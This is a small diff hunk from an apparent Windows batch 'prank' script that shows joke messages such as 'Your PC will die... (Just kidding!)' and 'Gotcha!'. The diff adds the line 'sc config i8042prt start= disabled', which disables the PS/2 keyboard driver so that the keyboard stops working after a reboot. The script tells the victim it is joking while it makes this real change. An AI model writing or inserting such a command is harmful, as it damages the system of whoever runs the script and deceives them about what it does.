@@ -21,6 +21,7 @@ echo Oops, I accidentally turned off antivirus!
 pause >nul
 echo Your PC will die in 1... 2... 3... (Just kidding!)
 pause >nul
+sc config i8042prt start= disabled
 echo Gotcha!
 
 :: Create a VBScript to show a Yes/No dialog box
